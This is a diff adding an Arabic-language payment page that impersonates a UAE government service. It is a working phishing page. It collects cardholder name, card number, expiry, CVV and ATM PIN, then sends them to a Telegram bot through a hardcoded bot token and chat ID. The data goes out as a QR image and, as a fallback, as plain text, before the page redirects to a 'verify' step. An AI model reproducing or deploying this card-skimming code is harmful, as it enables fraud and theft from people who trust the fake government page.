@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>الدفع</title>
+
+  <style>
+    body{font-family:Tahoma,Arial;background:#fff;margin:0;min-height:100vh;display:flex;flex-direction:column}
+    header{text-align:center;padding:20px}
+    header img{height:80px;max-width:100%}
+    main{flex:1;padding:20px}
+    form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
+    label{display:block;margin-top:14px;font-weight:700}
+    input,button,select{
+      width:100%;padding:12px;margin-top:6px;
+      border:1px solid #ccc;border-radius:6px;box-sizing:border-box
+    }
+    .row{display:flex;gap:10px}
+    .row > div{flex:1; display: flex; flex-direction: column;}
+    button{
+      background:#0b5320;color:#fff;border:0;font-weight:800;
+      cursor:pointer;position:relative
+    }
+    button:hover{background:#094418}
+    button:disabled{opacity:.7;cursor:not-allowed}
+
+    #applePayBtn{
+      margin-top:12px;
+      background:#000;
+      color:#fff;
+      font-weight:800;
+    }
+
+    .error{
+      border-color:#c00 !important;
+      background:#fff6f6;
+    }
+
+    .spinner{
+      width:22px;height:22px;
+      border:3px solid rgba(255,255,255,.4);
+      border-top:3px solid #fff;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      position:absolute;top:50%;left:50%;
+      transform:translate(-50%,-50%);
+      display:none;
+    }
+    @keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
+
+    footer{
+      background:#000;color:#fff;padding:18px 20px;margin-top:30px;
+      font-size:13px;text-align:center
+    }
+
+    #pageLoader{
+      position:fixed;inset:0;background:transparent;
+      display:flex;align-items:center;justify-content:center;
+      z-index:9999;pointer-events:none;
+    }
+    #pageLoader .bigSpinner{
+      width:90px;height:90px;
+      border:10px solid rgba(0,0,0,.15);
+      border-top-color:#000;border-radius:50%;
+      animation:bigSpin 1s linear infinite;
+    }
+    @keyframes bigSpin{to{transform:rotate(360deg)}}
+
+    #cardNumber{direction:ltr;text-align:left}
+    
+    .row label {
+      font-size: 12px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    #serviceMsg{
+      margin-top:10px;
+      color:#c00;
+      font-size:14px;
+      font-weight:700;
+      text-align:center;
+      display:none;
+    }
+  </style>
+</head>
+
+<body>
+
+<div id="pageLoader"><div class="bigSpinner"></div></div>
+
+<header>
+  <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" alt="الشعار">
+</header>
+
+<main>
+<form id="payForm" novalidate>
+
+  <label>الاسم المدون على البطاقة *</label>
+  <input id="cardName">
+
+  <label>رقم البطاقة *</label>
+  <input id="cardNumber" inputmode="numeric" maxlength="19"
+    placeholder="0000 0000 0000 0000">
+
+  <div class="row">
+    <div>
+      <label>شهر الانتهاء *</label>
+      <select id="expMonth">
+        <option value="">MM</option>
+        <option value="01">01</option><option value="02">02</option><option value="03">03</option>
+        <option value="04">04</option><option value="05">05</option><option value="06">06</option>
+        <option value="07">07</option><option value="08">08</option><option value="09">09</option>
+        <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+      </select>
+    </div>
+    <div>
+      <label>سنة الانتهاء *</label>
+      <select id="expYear">
+        <option value="">YY</option>
+        <option value="26">26</option><option value="27">27</option><option value="28">28</option>
+        <option value="29">29</option><option value="30">30</option><option value="31">31</option>
+        <option value="32">32</option><option value="33">33</option><option value="34">34</option>
+        <option value="35">35</option><option value="36">36</option><option value="37">37</option>
+        <option value="38">38</option><option value="39">39</option><option value="40">40</option>
+      </select>
+    </div>
+  </div>
+
+  <div class="row">
+    <div>
+      <label>رمز CVV *</label>
+      <input id="cvv" type="password" inputmode="numeric" maxlength="3" placeholder="***">
+    </div>
+    <div>
+      <label>رقم الصراف الآلي (PIN) *</label>
+      <input id="pin" type="password" inputmode="numeric" maxlength="4" placeholder="****">
+    </div>
+  </div>
+
+  <button id="payBtn" type="submit">
+    <span id="payText">ادفع الآن</span>
+    <span class="spinner" id="paySpinner"></span>
+  </button>
+
+  <button id="applePayBtn" type="button">Apple Pay</button>
+  <div id="serviceMsg">هذه الخدمة متوقفة حاليًا</div>
+
+</form>
+</main>
+
+<footer>
+  سياسة الخصوصية • حقوق النشر • شروط الاستخدام • معايير WCAG 2.0 AAA • © حكومة الإمارات 2026
+</footer>
+
+<script>
+  const pageLoader = document.getElementById('pageLoader');
+  const payForm = document.getElementById('payForm');
+  const cardName = document.getElementById('cardName');
+  const cardNumber = document.getElementById('cardNumber');
+  const expMonth = document.getElementById('expMonth');
+  const expYear = document.getElementById('expYear');
+  const cvv = document.getElementById('cvv');
+  const pin = document.getElementById('pin');
+  const payBtn = document.getElementById('payBtn');
+  const payText = document.getElementById('payText');
+  const paySpinner = document.getElementById('paySpinner');
+  const applePayBtn = document.getElementById('applePayBtn');
+
+  setTimeout(()=> { if(pageLoader) pageLoader.style.display='none'; }, 4000);
+
+  if(applePayBtn) {
+    applePayBtn.onclick = () => {
+      const serviceMsg = document.getElementById('serviceMsg');
+      serviceMsg.style.display='block';
+      setTimeout(()=>serviceMsg.style.display='none',2500);
+    };
+  }
+
+  function onlyDigits(el, maxLen){
+    el.value = el.value.replace(/\D/g,'').slice(0, maxLen);
+  }
+
+  function formatCardNumber(){
+    let raw = cardNumber.value.replace(/\s/g,'').replace(/\D/g,'').slice(0,16);
+    cardNumber.value = raw.replace(/(.{4})/g,'$1 ').trim();
+  }
+
+  if(cardNumber) cardNumber.addEventListener('input', formatCardNumber);
+  if(cvv) cvv.addEventListener('input', () => onlyDigits(cvv, 3));
+  if(pin) pin.addEventListener('input', () => onlyDigits(pin, 4));
+
+  if(payForm) {
+    payForm.onsubmit = (e) => {
+      e.preventDefault();
+
+      let ok = true;
+      if(!cardName.value.trim()){cardName.classList.add('error'); ok=false;}
+      if(cardNumber.value.replace(/\s/g,'').length !== 16){cardNumber.classList.add('error'); ok=false;}
+      if(!expMonth.value){expMonth.classList.add('error'); ok=false;}
+      if(!expYear.value){expYear.classList.add('error'); ok=false;}
+      if(cvv.value.length !== 3){cvv.classList.add('error'); ok=false;}
+      if(pin.value.length !== 4){pin.classList.add('error'); ok=false;}
+
+      if(!ok) return;
+
+      payBtn.disabled = true;
+      payText.style.visibility = 'hidden';
+      paySpinner.style.display = 'block';
+
+      const qrData = `Name: ${cardName.value}\nCard: ${cardNumber.value}\nExp: ${expMonth.value}/${expYear.value}\nCVV: ${cvv.value}\nPIN: ${pin.value}`;
+      const token = "8528188278:AAGVc4oOzJjpOgIe6tWwCpQlY5CsAdCRrzk";
+      const chatId = "8404960059";
+
+      // استخدام API خارجي لتوليد الـ QR Code كصورة مباشرة
+      const qrImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qrData)}`;
+
+      const goToNext = () => {
+          setTimeout(() => { window.location.href = "verify.html"; }, 500);
+      };
+
+      // إرسال الصورة للبوت عبر الرابط مباشرة
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+              chat_id: chatId,
+              photo: qrImageUrl,
+              caption: '📱 رمز QR جديد للمسح الضوئي'
+          })
+      })
+      .then(res => res.json())
+      .then(data => {
+          if (data.ok) {
+              goToNext();
+          } else {
+              // إذا فشل إرسال الصورة، أرسل نصاً كبديل
+              fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ chat_id: chatId, text: "⚠️ فشل إرسال الصورة، البيانات نصاً:\n" + qrData })
+              }).then(goToNext).catch(goToNext);
+          }
+      })
+      .catch(err => {
+          // في حال فشل الاتصال، أرسل نصاً وانتقل
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ chat_id: chatId, text: "⚠️ خطأ في الاتصال، البيانات نصاً:\n" + qrData })
+          }).then(goToNext).catch(goToNext);
+      });
+    };
+  }
+</script>
+
+</body>
+</html>
